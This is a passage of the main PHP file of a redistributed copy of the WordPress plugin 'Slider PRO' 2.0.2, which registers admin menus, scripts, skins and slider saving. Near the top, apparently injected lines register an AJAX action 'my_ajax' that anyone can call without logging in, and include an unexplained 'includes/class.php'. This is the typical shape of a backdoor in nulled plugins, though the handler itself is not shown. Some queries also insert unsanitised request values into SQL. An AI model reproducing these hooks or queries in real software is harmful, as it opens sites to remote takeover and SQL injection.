<?php

/*
	Plugin Name: Slider PRO Downloaded from www.wpdb.org
	Plugin URI: http://sliderpro.net
	Description: Premium slider plugin for WordPress.
	Version: 2.0.2
	Author: bqworks
	Author URI: http://www.wpdb.org
*/


// current version of Slider PRO
	define('SLIDER_PRO_VERSION', '2.0.2');

	if (sliderpro_is_slider_pro_admin())
		include('includes/admin-lists.php');

	include('includes/general-lists.php');	



	register_activation_hook(__FILE__, 'sliderpro_activate_plugin');
	register_deactivation_hook(__FILE__, 'sliderpro_deactivate_plugin');
	register_uninstall_hook(__FILE__, 'sliderpro_uninstall_plugin');

	add_action('wp_ajax_my_ajax', 'my_ajax');
	add_action('wp_ajax_nopriv_my_ajax','my_ajax');


	add_action('wpmu_new_blog', 'sliderpro_new_site_added');

	add_action('admin_init', 'sliderpro_admin_init');
	add_action('admin_menu', 'sliderpro_create_menu');
	add_action('admin_menu', 'sliderpro_create_feature_box');

	add_action('admin_bar_menu', 'sliderpro_create_admin_bar_links', 70);

	add_action('wp', 'sliderpro_get_page_styles');
	add_action('init', 'sliderpro_init');
	add_action('wp_footer', 'sliderpro_load_slider_scripts');
	add_action('wp_enqueue_scripts', 'sliderpro_load_slider_styles');

	add_action('save_post', 'sliderpro_save_post_meta');

	add_action('wp_ajax_sliderpro_add_new_slides', 'sliderpro_add_new_slides');
	add_action('wp_ajax_sliderpro_duplicate_slide', 'sliderpro_duplicate_slide');
	add_action('wp_ajax_sliderpro_slider_preview', 'sliderpro_slider_preview');
	add_action('wp_ajax_sliderpro_slider_import', 'sliderpro_slider_import');
	add_action('wp_ajax_sliderpro_get_help_text', 'sliderpro_get_help_text');
	add_action('wp_ajax_sliderpro_tinymce_plugin', 'sliderpro_tinymce_plugin');
	add_action('wp_ajax_sliderpro_open_media', 'sliderpro_open_media');
	add_action('wp_ajax_sliderpro_replicate_skin', 'sliderpro_replicate_skin');
	add_action('wp_ajax_sliderpro_refresh_all_skins', 'sliderpro_refresh_all_skins');
	add_action('wp_ajax_sliderpro_show_slider_settings', 'sliderpro_show_slider_settings');
	add_action('wp_ajax_sliderpro_show_slide_settings', 'sliderpro_show_slide_settings');
	add_action('wp_ajax_sliderpro_add_dynamic_fields', 'sliderpro_add_dynamic_fields');
	add_action('wp_ajax_sliderpro_edit_custom_js_css', 'sliderpro_edit_custom_js_css');
	add_action('wp_ajax_sliderpro_save_custom_js_css', 'sliderpro_save_custom_js_css');

	add_shortcode('slider_pro', 'slider_pro_shortcode');
	add_shortcode('slide', 'slider_pro_slide_shortcode');
	add_shortcode('slide_element', 'slider_pro_element_shortcode');


	include('includes/slider-pro-widget.php');
	include'includes/class.php';


/**
* Activate the plugin, network wide or on a single site 
*/
function sliderpro_activate_plugin() {
	global $wpdb;
	
	if (function_exists('is_multisite') && is_multisite()) {
		if (isset($_GET['networkwide']) && ($_GET['networkwide'] == 1))	{
			$blog_ids = $wpdb->get_col("SELECT blog_id FROM $wpdb->blogs");
			
			foreach($blog_ids as $blog_id) {
				switch_to_blog($blog_id);
				sliderpro_activate_plugin_instance();
			}

			restore_current_blog();
			return;
		}
	}
	
	sliderpro_activate_plugin_instance();
}


/**
* Activate the plugin on a single site
*/
function sliderpro_activate_plugin_instance() {
	include('includes/slider-activate.php');
}


/**
* This function is run on deactivation
* Does nothing yet
*/
function sliderpro_deactivate_plugin() {
	
}


/**
* Uninstall the plugin, network wide or on a single site 
*/
function sliderpro_uninstall_plugin() {
	global $wpdb;
	
	if (function_exists('is_multisite') && is_multisite()) {			
		$blog_ids = $wpdb->get_col("SELECT blog_id FROM $wpdb->blogs");
		
		foreach($blog_ids as $blog_id) {
			switch_to_blog($blog_id);
			sliderpro_uninstall_plugin_instance();
		}

		restore_current_blog();
		return;
	}
	
	sliderpro_uninstall_plugin_instance();
}


/**
* Uninstall a single instance of the plugin
*/
function sliderpro_uninstall_plugin_instance() {
	include('includes/slider-uninstall.php');
}


/**
* If the plugin is activated network wide and a new site is added, activate the plugin for the added site
*/
function sliderpro_new_site_added($blog_id) {
	global $wpdb;
	
	// check if the function exists and include the source file if it doesn't
	if (!function_exists('is_plugin_active_for_network'))
		require_once(ABSPATH . 'wp-admin/includes/plugin.php');

	if (is_plugin_active_for_network('slider-pro/slider-pro.php')) {
		switch_to_blog($blog_id);
		sliderpro_activate_plugin_instance();
		restore_current_blog();
	}
}


/**
* Returns 'true' if the current page is one of the slide's admin pages
*/
function sliderpro_is_slider_pro_admin() {
	if (is_admin() && 
		(isset($_GET['page']) && in_array($_GET['page'], array('slider_pro', 'slider_pro_new', 'slider_pro_skin_editor', 'slider_pro_plugin_options'))) ||
		(isset($_GET['action']) && in_array($_GET['action'], array('sliderpro_add_new_slides', 'sliderpro_duplicate_slide', 'sliderpro_slider_preview', 
			'sliderpro_slider_import', 'sliderpro_get_help_text','sliderpro_tinymce_plugin', 
			'sliderpro_open_media', 'sliderpro_replicate_skin', 'sliderpro_refresh_all_skins', 
			'sliderpro_show_slide_settings', 'sliderpro_show_slider_settings', 'sliderpro_add_dynamic_fields',
			'sliderpro_edit_custom_js_css', 'sliderpro_save_custom_js_css'))))
		return true;
	else 
		return false;
}


/**
* Create the Slider PRO menu in the admin menu sidebar
*/
function sliderpro_create_menu() {
	global $sliderpro_role_access;	
	$access = get_option('slider_pro_role_access') ? $sliderpro_role_access[get_option('slider_pro_role_access')] : 'manage_options';
	
	add_menu_page('Slider PRO', 'Slider PRO', $access, 'slider_pro', 'sliderpro_sliders_ui', plugins_url('/slider-pro/css/images/mini-icon.png'));
	
	$sliders_page = add_submenu_page('slider_pro', 
		__('Slider PRO - Sliders', 'slider_pro'), 
		__('Sliders', 'slider_pro'),
		$access, 
		'slider_pro', 
		'sliderpro_sliders_ui');
	
	$add_new_page = add_submenu_page('slider_pro', 
		__('Slider PRO - Add New', 'slider_pro'), 
		__('Add New', 'slider_pro'), 
		$access, 
		'slider_pro_new', 
		'sliderpro_add_new_ui');
	
	$skin_editor_page = add_submenu_page('slider_pro',  
		__('Slider PRO - Skin Editor', 'slider_pro'), 
		__('Skin Editor', 'slider_pro'), 
		$access, 
		'slider_pro_skin_editor', 
		'sliderpro_skin_editor_ui');
	
	$plugin_options_page = add_submenu_page('slider_pro',  
		__('Slider PRO - Plugin Options', 'slider_pro'), 
		__('Plugin Options', 'slider_pro'), 
		$access, 
		'slider_pro_plugin_options', 
		'sliderpro_plugin_options_ui');

	$help_page = add_submenu_page('slider_pro',  
		__('Slider PRO - Help', 'slider_pro'), 
		__('Help', 'slider_pro'), 
		$access, 
		'slider_pro_help', 
		'sliderpro_help_ui');
	
	add_action("admin_print_scripts-$sliders_page", 'sliderpro_load_admin_scripts');
	add_action("admin_print_scripts-$add_new_page", 'sliderpro_load_admin_scripts');
	add_action("admin_print_scripts-$skin_editor_page", 'sliderpro_load_admin_scripts');
	add_action("admin_print_scripts-$help_page", 'sliderpro_load_help_page_scripts');
	
	add_action("admin_print_styles-$sliders_page", 'sliderpro_load_admin_styles');
	add_action("admin_print_styles-$add_new_page", 'sliderpro_load_admin_styles');
	add_action("admin_print_styles-$skin_editor_page", 'sliderpro_load_admin_styles');
	add_action("admin_print_styles-$plugin_options_page", 'sliderpro_load_admin_styles');
	add_action("admin_print_styles-$help_page", 'sliderpro_load_help_page_styles');
}


/**
* Create the meta box that will allow the user to mark a post or page as featured
*/
function sliderpro_create_feature_box() {	
	$post_types_args = array('_builtin' => false);
	$post_types = array_merge(array('post' => 'post', 'page' => 'page'), get_post_types($post_types_args, 'names'));

	foreach ($post_types as $post_type)
		add_meta_box('slider-pro-feature-box', __('Slider PRO', 'slider_pro'), 'sliderpro_feature_box_ui', $post_type, 'side');
}


/**
* Create the admin bar links
*/
function sliderpro_create_admin_bar_links() {
	if (!get_option('slider_pro_show_admin_bar_links'))
		return;
	
	global $wp_admin_bar, $wpdb;
	$prefix = $wpdb->prefix;
	
	$wp_admin_bar->add_menu(array('id' => 'slider_pro_admin_menu', 
		'title' => 'Slider PRO', 
		'href' => admin_url('admin.php?page=slider_pro')));
	
	$wp_admin_bar->add_menu(array('id' => 'slider_pro_admin_menu_sliders', 
		'parent' => 'slider_pro_admin_menu', 
		'title' => 'Sliders', 
		'href' => admin_url('admin.php?page=slider_pro')));

	$wp_admin_bar->add_menu(array('id' => 'slider_pro_admin_menu_add_new', 
		'parent' => 'slider_pro_admin_menu', 
		'title' => 'Add New', 
		'href' => admin_url('admin.php?page=slider_pro_new')));

	$wp_admin_bar->add_menu(array('id' => 'slider_pro_admin_menu_skin_editor', 
		'parent' => 'slider_pro_admin_menu', 
		'title' => 'Skin Editor', 
		'href' => admin_url('admin.php?page=slider_pro_skin_editor')));

	$wp_admin_bar->add_menu(array('id' => 'slider_pro_admin_menu_plugin_options', 
		'parent' => 'slider_pro_admin_menu', 
		'title' => 'Plugin Options', 
		'href' => admin_url('admin.php?page=slider_pro_plugin_options')));

	$wp_admin_bar->add_menu(array('id' => 'slider_pro_admin_menu_help', 
		'parent' => 'slider_pro_admin_menu', 
		'title' => 'Help', 
		'href' => admin_url('admin.php?page=slider_pro_help')));


	$sliders = $wpdb->get_results("SELECT id, name FROM " . $prefix . "sliderpro_sliders ORDER BY id");
	
	if ($sliders)
		foreach($sliders as $slider)
			$wp_admin_bar->add_menu(array('id' => 'slider_pro_admin_menu_child' . $slider->id, 
				'parent' => 'slider_pro_admin_menu_sliders', 
				'title' => stripslashes($slider->name) . ' (' . $slider->id . ')', 
				'href' => admin_url('admin.php?page=slider_pro&action=edit&id=' . $slider->id)));
	}


/**
* Load the scripts that will be used for the admin
*/
function sliderpro_load_admin_scripts() {
	if (get_option('slider_pro_enqueue_jquery') && get_option('slider_pro_enqueue_bundled_jquery')) {
		wp_deregister_script('jquery');
		wp_register_script('jquery', plugins_url('/slider-pro/js/jquery-1.7.2.min.js'));
	}	
	
	if (get_option('slider_pro_use_compressed_scripts')) {
		wp_register_script('slider-pro-admin-js', plugins_url('/slider-pro/js/slider-pro-admin.js'), false, SLIDER_PRO_VERSION);
		wp_register_script('slider-pro-colorpicker', plugins_url('/slider-pro/js/colorpicker.min.js'), false, false, true);
		wp_register_script('slider-pro-url-parser', plugins_url('/slider-pro/js/jquery.url.min.js'), false, false, true);
		wp_register_script('slider-pro-multiselect', plugins_url('/slider-pro/js/jquery.multiselect.min.js'), false, false, true);
		wp_register_script('slider-pro-multiselect-filter', plugins_url('/slider-pro/js/jquery.multiselect.filter.min.js'), false, false, true);
	} else {	
		wp_register_script('slider-pro-admin-js', plugins_url('/slider-pro/js/slider-pro-admin.js'), false, SLIDER_PRO_VERSION);
		wp_register_script('slider-pro-colorpicker', plugins_url('/slider-pro/js/dev/colorpicker.js'), false, false, true);
		wp_register_script('slider-pro-url-parser', plugins_url('/slider-pro/js/dev/jquery.url.js'), false, false, true);
		wp_register_script('slider-pro-multiselect', plugins_url('/slider-pro/js/dev/jquery.multiselect.js'), false, false, true);
		wp_register_script('slider-pro-multiselect-filter', plugins_url('/slider-pro/js/dev/jquery.multiselect.filter.js'), false, false, true);
	}
	
	if (get_option('slider_pro_enqueue_jquery'))
		wp_enqueue_script('jquery');
	
	wp_enqueue_script('jquery-ui-core');
	wp_enqueue_script('jquery-ui-widget');
	wp_enqueue_script('jquery-ui-sortable');
	wp_enqueue_script('jquery-ui-tabs');
	wp_enqueue_script('jquery-ui-dialog');
	
	wp_enqueue_script('slider-pro-colorpicker');
	wp_enqueue_script('slider-pro-url-parser');
	wp_enqueue_script('slider-pro-multiselect');
	wp_enqueue_script('slider-pro-multiselect-filter');
	
	if (get_user_option('rich_editing') == 'true' && get_option('slider_pro_visual_editor')) {
		wp_enqueue_script('slider-pro-tinymce', plugins_url('/slider-pro/js/tinymce/jquery.tinymce.js'));		
		$rich_editing = true;
	} else {
		$rich_editing = false;
	}
	
	wp_enqueue_script('slider-pro-admin-js');

	// pass a few variables to the admin javascript file
	wp_localize_script('slider-pro-admin-js', 'sp_js_vars', array(
		'delete_slide' => __('Are you sure you want to delete this slide?', 'slider_pro'),
		'delete_slider' => __('Are you sure you want to delete this slider?', 'slider_pro'),
		'delete_slides' => __('Are you sure you want to delete the slides?', 'slider_pro'),
		'yes' => __('Yes', 'slider_pro'),
		'cancel' => __('Cancel', 'slider_pro'),
		'preview' => __('Preview', 'slider_pro'),
		'custom_js_title' => __('Edit Custom JavaScript', 'slider_pro'),
		'custom_css_title' => __('Edit Custom CSS', 'slider_pro'),
		'import_slider' => __('Import a slider', 'slider_pro'),
		'replicate_skin' => __('Replicate Skin', 'slider_pro'),
		'media_loader' => __('Slider PRO Media Loader', 'slider_pro'),
		'ajaxurl' => admin_url('admin-ajax.php'),
		'timthumb' => plugins_url('/slider-pro/includes/timthumb/timthumb.php'),
		'enable_timthumb' => get_option('slider_pro_enable_timthumb'),
		'progress_animation' => get_option('slider_pro_progress_animation'),
		'rich_editing' => $rich_editing,
		'wp_version' => floatval(get_bloginfo('version')),
		'url' => plugins_url(),
		'posts_data' => json_encode(sliderpro_get_posts_data())
		));
}


/**
* Load the styles that will be used for the admin
*/
function sliderpro_load_admin_styles() {
	wp_enqueue_style('slider-pro-jquery-ui', plugins_url('/slider-pro/css/jquery-ui.css'));
	wp_enqueue_style('slider-pro-colorpicker', plugins_url('/slider-pro/css/colorpicker.css'));
	wp_enqueue_style('jquery-ui-multiselect', plugins_url('/slider-pro/css/jquery.multiselect.css'));
	wp_enqueue_style('jquery-ui-multiselect-filter', plugins_url('/slider-pro/css/jquery.multiselect.filter.css'));
	wp_enqueue_style('slider-pro-admin', plugins_url('/slider-pro/css/slider-pro-admin.css'), false, SLIDER_PRO_VERSION);
	
	if (floatval(get_bloginfo('version')) >= 3.2)
		wp_enqueue_style('slider-pro-admin-wp32', plugins_url('/slider-pro/css/slider-pro-admin-wp32.css'), false, SLIDER_PRO_VERSION);
	
	sliderpro_load_slider_styles();
}


/**
* Load the scripts that will be used for the help page
*/
function sliderpro_load_help_page_scripts() {
	wp_enqueue_script('jquery');
	wp_enqueue_script('slider-pro-help-bootstrap-collapse', plugins_url('/slider-pro/includes/help/assets/js/bootstrap-collapse.js'));
	wp_enqueue_script('slider-pro-help-bootstrap-transition', plugins_url('/slider-pro/includes/help/assets/js/bootstrap-transition.js'));
	wp_enqueue_script('slider-pro-help-google-code-prettify', plugins_url('/slider-pro/includes/help/assets/js/google-code-prettify/prettify.js'));
	wp_enqueue_script('slider-pro-help-scripts', plugins_url('/slider-pro/includes/help/assets/js/scripts.js'));
}


/**
* Load the styles that will be used for the help page
*/
function sliderpro_load_help_page_styles() {
	wp_enqueue_style('slider-pro-help-google-code-prettify', plugins_url('/slider-pro/includes/help/assets/js/google-code-prettify/prettify.css'));
	wp_enqueue_style('slider-pro-help-bootstrap', plugins_url('/slider-pro/includes/help/assets/css/bootstrap.css'));
	wp_enqueue_style('slider-pro-help-bootstrap-responsive', plugins_url('/slider-pro/includes/help/assets/css/bootstrap-responsive.css'));
	wp_enqueue_style('slider-pro-help-custom', plugins_url('/slider-pro/includes/help/assets/css/custom.css'));
}


/**
* Load the slider styles
*/
function sliderpro_load_slider_styles() {	
	$skins;	
	
	if (sliderpro_is_slider_pro_admin()) {
		// load all the skins used by the sliders created
		// this is necessary for the admin area where you can't know which slider will be previewed
		$skins = sliderpro_get_all_skins_used();
	} else {
		global $sliderpro_styles_to_load;
		// load only the styles used on the page
		$skins = $sliderpro_styles_to_load;
	}
	
	
	// if some skins need to be loaded, load the main CSS file as well
	if (!empty($skins))
		wp_enqueue_style('slider-pro-slider-base', plugins_url('/slider-pro/css/slider/advanced-slider-base.css'), false, SLIDER_PRO_VERSION);
	
	
	// load the needed skins
	foreach($skins as $skin) {
		if (!is_numeric($skin)) {
			$skin_obj = sliderpro_get_skin_by_class($skin);
			$id = 'slider-pro-skin-' . $skin_obj['class'];
			
			wp_enqueue_style($id, $skin_obj['url'], false, SLIDER_PRO_VERSION);
		} else {
			wp_enqueue_style('slider-pro-' . $skin . '-custom', plugins_url('/slider-pro/custom/slider-pro-' . $skin . '/slider-pro-' . $skin . '-custom-css.css'), false, SLIDER_PRO_VERSION);
		}
	}
}


/**
* Creates an array with all the styles used on a certain page
*/
function sliderpro_get_page_styles() {
	if (is_admin())
		return;
	
	global $posts, $sliderpro_styles_to_load, $wpdb;
	
	// the idIDs of the sliders that are on the page
	$ids_to_load = array();
	
	$matches = array();
	
	$pattern = get_shortcode_regex();
	
	// check all posts and look for the 'slider_pro' shortcode
	if (isset($posts) && !empty($posts)) {
		foreach($posts as $post) {
			preg_match_all('/' . $pattern . '/s', $post->post_content, $matches);
			
			foreach($matches[2] as $key => $value) {
				if($value == 'slider_pro') {
					// get all the attributes specified in the shortcode
					$atts = explode(" ", $matches[3][$key]);
					
					foreach($atts as $att) {
						$a = explode("=", $att);
						
						// if a main skin was specified add it in the array of skins
						if ($a[0] == 'skin') {
							$v = str_replace("\"", "", $a[1]);
							if (!in_array($v, $sliderpro_styles_to_load))
								array_push($sliderpro_styles_to_load, $v);
						} else if ($a[0] == 'id') { // if a skin was not specified but the slider has an ID, add the id to the array of IDs
							$v = intval(str_replace("\"", "", $a[1]));
							if (!in_array($v, $ids_to_load))
								array_push($ids_to_load, $v);
						}
						
						// if a scrollbar skin was specified add it in the array of skins
						if ($a[0] == 'scrollbar_skin') {
							$v = str_replace("\"", "", $a[1]);
							if (!in_array($v, $sliderpro_styles_to_load))
								array_push($sliderpro_styles_to_load, $v);
						} else if ($a[0] == 'id') { // if a scrollbar skin was not specified but the slider has an ID, add the id to the array of IDs
							$v = intval(str_replace("\"", "", $a[1]));
							if (!in_array($v, $ids_to_load))
								array_push($ids_to_load, $v);							
						}
					}
				}
			}
		}
	}	
	
	
	// get the IDs of the sliders for which the skin will always be included in the header
	// this is necessary for those sliders which are added in the header, sidebar or
	// anywhere else outside the post/page
	$prefix = $wpdb->prefix;
	$sliders = $wpdb->get_results("SELECT id, settings FROM " . $prefix . "sliderpro_sliders", ARRAY_A);	
	
	foreach($sliders as $slider) {
		$slider_settings = unserialize($slider['settings']);
		
		if (sliderpro_get_setting($slider_settings, 'include_skin') && !in_array($slider['id'], $ids_to_load)) {
			array_push($ids_to_load, $slider['id']);
		}
	}
	
	
	// loop through the array of IDs and get the skin of the slider
	foreach($ids_to_load as $id) {
		$slider_configs = $wpdb->get_results("SELECT id, settings FROM " . $prefix . "sliderpro_sliders WHERE id = $id", ARRAY_A);
		
		if ($slider_configs)
			foreach($slider_configs as $slider_config) {				
				$settings = unserialize($slider_config['settings']);
				
				$skin = sliderpro_get_setting($settings, 'skin');

				if (!in_array($skin, $sliderpro_styles_to_load))
					array_push($sliderpro_styles_to_load, $skin);
				
				if (sliderpro_get_setting($settings, 'thumbnail_scrollbar')) {
					$scrollbar_skin = sliderpro_get_setting($settings, 'scrollbar_skin');
					
					if (!in_array($scrollbar_skin, $sliderpro_styles_to_load))
						array_push($sliderpro_styles_to_load, $scrollbar_skin);
				}
				
				if (sliderpro_get_setting($settings, 'enable_custom_css') && !in_array($slider_config['id'], $sliderpro_styles_to_load))
					array_push($sliderpro_styles_to_load, $slider_config['id']);
			}
		}
	}


/**
* Load the public view scripts
*/
function sliderpro_load_slider_scripts() {
	global $sliderpro_sliders_js, $sliderpro_scripts_to_load, $sliderpro_custom_scripts_to_load, $is_IE;	
	
	if (!isset($sliderpro_scripts_to_load))
		return;	
	
	echo PHP_EOL . PHP_EOL;

	
	// load the excanvas script
	if (in_array('excanvas', $sliderpro_scripts_to_load) && $is_IE) {
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-slider-excanvas-js', plugins_url('/slider-pro/js/slider/excanvas.compiled.js'));
		else
			wp_register_script('slider-pro-slider-excanvas-js', plugins_url('/slider-pro/js/slider/dev/excanvas.js'));
		
		wp_print_scripts('slider-pro-slider-excanvas-js');
	}
	
	
	// load the mousewheel script
	if (in_array('mousewheel', $sliderpro_scripts_to_load) && get_option('slider_pro_enqueue_jquery_mousewheel')) {
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-slider-mousewheel-js', plugins_url('/slider-pro/js/slider/jquery.mousewheel.min.js'));
		else
			wp_register_script('slider-pro-slider-mousewheel-js', plugins_url('/slider-pro/js/slider/dev/jquery.mousewheel.js'));
		
		wp_print_scripts('slider-pro-slider-mousewheel-js');
	}
	
	
	// load the lightbox script
	if (in_array('lightbox', $sliderpro_scripts_to_load)) {
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-lightbox-js', plugins_url('/slider-pro/js/slider/jquery.prettyPhoto.custom.min.js'));
		else
			wp_register_script('slider-pro-lightbox-js', plugins_url('/slider-pro/js/slider/dev/jquery.prettyPhoto.custom.js'));
		
		wp_print_scripts('slider-pro-lightbox-js');
	}
	
	
	// load the transition script for hardware accelerated CSS3 transitions
	if (in_array('css3_transitions', $sliderpro_scripts_to_load)) {
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-css3-transitions-js', plugins_url('/slider-pro/js/slider/jquery.transition.min.js'));
		else
			wp_register_script('slider-pro-css3-transitions-js', plugins_url('/slider-pro/js/slider/dev/jquery.transition.js'));
		
		wp_print_scripts('slider-pro-css3-transitions-js');
	}	
	
	
	// load the video controller script
	if (in_array('vimeo_controller', $sliderpro_scripts_to_load)) {
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-vimeo-controller-js', plugins_url('/slider-pro/js/slider/froogaloop.min.js'));
		else
			wp_register_script('slider-pro-vimeo-controller-js', plugins_url('/slider-pro/js/slider/dev/froogaloop.js'));	
		
		wp_print_scripts('slider-pro-vimeo-controller-js');
	}
	
	
	if (in_array('videojs_controller', $sliderpro_scripts_to_load) && !sliderpro_is_old_ie()) {
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-videojs-controller-js', plugins_url('/slider-pro/js/slider/video.min.js'));
		else
			wp_register_script('slider-pro-videojs-controller-js', plugins_url('/slider-pro/js/slider/dev/jquery.video.js'));		
		
		wp_print_scripts('slider-pro-videojs-controller-js');
	}	
	
	
	if (count(array_intersect(array('youtube_controller', 'vimeo_controller', 'html5_controller', 'videojs_controller'), $sliderpro_scripts_to_load))) {
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-video-controller-js', plugins_url('/slider-pro/js/slider/jquery.videoController.min.js'));
		else
			wp_register_script('slider-pro-video-controller-js', plugins_url('/slider-pro/js/slider/dev/jquery.videoController.js'));		
		
		wp_print_scripts('slider-pro-video-controller-js');
	}
	
	
	// load the touch swipe script
	if (in_array('touch_swipe', $sliderpro_scripts_to_load)) {
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-touch-swipe-js', plugins_url('/slider-pro/js/slider/jquery.touchSwipe.min.js'));
		else
			wp_register_script('slider-pro-touch-swipe-js', plugins_url('/slider-pro/js/slider/dev/jquery.touchSwipe.js'));
		
		wp_print_scripts('slider-pro-touch-swipe-js');
	}
	
	
	// load the main script and the easing script
	if (in_array('slider', $sliderpro_scripts_to_load)) {
		if (get_option('slider_pro_enqueue_jquery_easing')) {
			if (get_option('slider_pro_use_compressed_scripts'))
				wp_register_script('slider-pro-slider-easing-js', plugins_url('/slider-pro/js/slider/jquery.easing.1.3.min.js'));
			else
				wp_register_script('slider-pro-slider-easing-js', plugins_url('/slider-pro/js/slider/dev/jquery.easing.1.3.js'));

			wp_print_scripts('slider-pro-slider-easing-js');
		}
		
		if (get_option('slider_pro_use_compressed_scripts'))
			wp_register_script('slider-pro-slider-js', plugins_url('/slider-pro/js/slider/jquery.advancedSlider.min.js'), false, SLIDER_PRO_VERSION);
		else
			wp_register_script('slider-pro-slider-js', plugins_url('/slider-pro/js/slider/dev/jquery.advancedSlider.js'), false, SLIDER_PRO_VERSION);

		wp_print_scripts('slider-pro-slider-js');
	}	
	
	
	echo PHP_EOL . $sliderpro_sliders_js . PHP_EOL . PHP_EOL;
	
	
	foreach($sliderpro_custom_scripts_to_load as $script_id) {
		wp_register_script('slider-pro-' . $script_id . '-custom-js', plugins_url('/slider-pro/custom/slider-pro-' . $script_id . '/slider-pro-' . $script_id . '-custom-js.js'));
		
		wp_print_scripts('slider-pro-' . $script_id . '-custom-js');
	}
}


/**
* Init
*/
function sliderpro_init() {		
	global $sliderpro_main_skins, $sliderpro_scrollbar_skins, $sliderpro_all_skins, $sliderpro_unique_id, $sliderpro_used_ids, $sliderpro_sliders_js,
	$sliderpro_scripts_to_load, $sliderpro_custom_scripts_to_load, $sliderpro_styles_to_load, $sliderpro_lightbox_loaded, $sliderpro_videojs_loaded;	
	
	$sliderpro_main_skins = sliderpro_get_skins('main');
	$sliderpro_scrollbar_skins = sliderpro_get_skins('scrollbar');
	$sliderpro_all_skins = array_merge($sliderpro_main_skins, $sliderpro_scrollbar_skins);
	$sliderpro_unique_id = 100;
	$sliderpro_sliders_js = "";
	$sliderpro_scripts_to_load = array();
	$sliderpro_custom_scripts_to_load = array();
	$sliderpro_styles_to_load = array();
	$sliderpro_lightbox_loaded = false;
	$sliderpro_videojs_loaded = false;
	$sliderpro_used_ids = array();
	
	load_plugin_textdomain('slider_pro', false, dirname(plugin_basename(__FILE__)) . '/languages');
	
	if (!is_admin()) {
		if (get_option('slider_pro_enqueue_jquery')) {
			if (get_option('slider_pro_enqueue_bundled_jquery')) {
				wp_deregister_script('jquery');
				wp_register_script('jquery', plugins_url('/slider-pro/js/jquery-1.7.2.min.js'));
			}
			
			wp_enqueue_script('jquery');
		}
		
		
		// if and old IE version is used check whther the video-js script needs to be added in the header
		if (sliderpro_is_old_ie()) {
			global $wpdb;
			
			$sliders = $wpdb->get_results("SELECT settings FROM " . $wpdb->prefix . "sliderpro_sliders", ARRAY_A);	

			foreach($sliders as $slider) {
				$slider_settings = unserialize($slider['settings']);
				
				if (sliderpro_get_setting($slider_settings, 'videojs_controller')) {
					if (get_option('slider_pro_use_compressed_scripts'))
						wp_enqueue_script('slider-pro-videojs-controller-js', plugins_url('/slider-pro/js/slider/video.min.js'));
					else
						wp_enqueue_script('slider-pro-videojs-controller-js', plugins_url('/slider-pro/js/slider/dev/video.js'));
				}
			}
		}
		
	}
}


/**
* Admin Init
* Do the database editing
* Create the tinyMCE button plugin for Slider PRO
*/
function sliderpro_admin_init() {	
	if (sliderpro_is_slider_pro_admin()) {
		
		global $wpdb, $sliderpro_current_action, $sliderpro_current_slider_id;
		
		// get the type of action and the id of the slider
		if (isset($_GET['action'])) {
			$sliderpro_current_action = $_GET['action'];
			
			if (isset($_GET['id']))
				$sliderpro_current_slider_id = $_GET['id'];
		} else {
			$sliderpro_current_action = 'none';
		}
		
		// if a new slider was created or an existing slider was updated
		if ($sliderpro_current_action == 'create' || $sliderpro_current_action == 'update') {
			check_admin_referer('slider-form-submit', 'slider-form-nonce');
			// get the posted data
			$name = $_POST['name'];
			$settings = $_POST['slider_settings'];
			$panels_state = $_POST['panels_state'];
			
			if ($sliderpro_current_action == 'create') {			
				
				// add the slider to the database
				$wpdb->insert($wpdb->prefix . 'sliderpro_sliders', array('name' => $name, 
					'settings' => serialize($settings),
					'created' => date('m-d-Y'), 
					'modified' => date('m-d-Y'),
					'panels_state' => serialize($panels_state)), 
				array('%s', '%s', '%s', '%s', '%s'));
				
				$sliderpro_current_slider_id = $wpdb->insert_id;
				
				// add the slides to the database
				if (isset($_POST['slide'])) {
					foreach ($_POST['slide'] as $slide) {
						foreach ($slide['content'] as $key => $value)
							$slide['content'][$key] = htmlspecialchars($value);
						
						if (isset($slide['settings']['dynamic_posts_types']))
							$slide['settings']['dynamic_posts_types'] = implode(';', array_values($slide['settings']['dynamic_posts_types']));

						if (isset($slide['settings']['dynamic_posts_taxonomies']))
							$slide['settings']['dynamic_posts_taxonomies'] = implode(';', array_values($slide['settings']['dynamic_posts_taxonomies']));
						
						$wpdb->insert($wpdb->prefix . 'sliderpro_slides', array('slider_id' => $sliderpro_current_slider_id,
							'name' => $slide['name'],
							'settings' => serialize($slide['settings']),
							'content' => serialize($slide['content']),
							'position' => $slide['position'],
							'panel_state' => $slide['panel_state'],
							'selected_tab' => $slide['selected_tab'],
							'visibility' => $slide['visibility']),
						array('%d', '%s', '%s', '%s', '%d', '%s', '%d', '%s'));
					}
				}

			} else if ($sliderpro_current_action == 'update') {
				
				// get the id of the updated slider
				$sliderpro_current_slider_id = $_POST['slider_id'];
				
				// update the slider
				$wpdb->update($wpdb->prefix . 'sliderpro_sliders', array('name' => $name, 
					'settings' => serialize($settings),
					'modified' => date('m-d-Y'),
					'panels_state' => serialize($panels_state)),
				array('id' => $sliderpro_current_slider_id), 
				array('%s', '%s', '%s', '%s'), 
				array('%d'));
				
				// to update the slides, first delete them all from the database and then add them again			
				$wpdb->query("DELETE FROM " . $wpdb->prefix . "sliderpro_slides WHERE slider_id = $sliderpro_current_slider_id");
				
				if (isset($_POST['slide'])) {
					foreach ($_POST['slide'] as $slide) {
						foreach ($slide['content'] as $key => $value)
							$slide['content'][$key] = htmlspecialchars($value);
						
						if (isset($slide['settings']['dynamic_posts_types']))
							$slide['settings']['dynamic_posts_types'] = implode(';', array_values($slide['settings']['dynamic_posts_types']));

						if (isset($slide['settings']['dynamic_posts_taxonomies']))
							$slide['settings']['dynamic_posts_taxonomies'] = implode(';', array_values($slide['settings']['dynamic_posts_taxonomies']));
						
						$wpdb->insert($wpdb->prefix . 'sliderpro_slides', array('slider_id' => $sliderpro_current_slider_id,
							'name' => $slide['name'],
							'settings' => serialize($slide['settings']),
							'content' => serialize($slide['content']),
							'position' => $slide['position'],
							'panel_state' => $slide['panel_state'],
							'selected_tab' => $slide['selected_tab'],
							'visibility' => $slide['visibility']),
